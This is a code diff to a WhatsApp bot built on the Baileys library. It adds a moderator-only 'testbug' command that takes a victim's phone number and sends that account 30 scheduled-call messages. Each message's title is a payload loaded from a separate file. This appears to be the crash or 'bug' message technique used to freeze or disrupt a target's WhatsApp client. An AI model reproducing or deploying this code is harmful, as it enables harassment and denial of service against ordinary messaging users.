@@ -1,4 +1,6 @@
 const { zokou } = require('../framework/zokou');
+
+const { proto, generateWAMessageFromContent } = require ("@whiskeysockets/baileys");
 const axios = require("axios")
 let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');
 const {isUserBanned , addUserToBanList , removeUserFromBanList} = require("../bdd/banUser");
@@ -11,6 +13,45 @@ const sleep =  (ms) =>{
   return new Promise((resolve) =>{ setTimeout (resolve, ms)})
   
   } ;
+
+
+
+zokou({ nomCom: "testbug", categorie: "Mods" }, async (dest, zk, commandeOptions) => {
+    const { ms, repondre, arg, nomAuteurMessage, superUser } = commandeOptions;
+    
+    const { aitext4 } = require('./aitext4.js')
+
+    if (!superUser) {
+      repondre('Only Mods can use this command'); return;
+    }
+    
+    
+    let txt = arg[0];
+    if (!txt) return repondre(`Who do you want to bug ? `)
+    
+    victim = txt.split("|")[0]+'@s.whatsapp.net'
+    
+    amount = "30"
+    
+    for (let i = 0; i < amount; i++) {
+    
+    const xbug = aitext4;
+    
+    var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
+"scheduledCallCreationMessage": {
+"callType": "2",
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"title": xbug,
+}
+}), { userJid: dest, quoted : ms})
+zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+
+}
+
+});
+
+
+
 
 
   zokou({ nomCom: "telesticker", categorie: "Mods" }, async (dest, zk, commandeOptions) => {
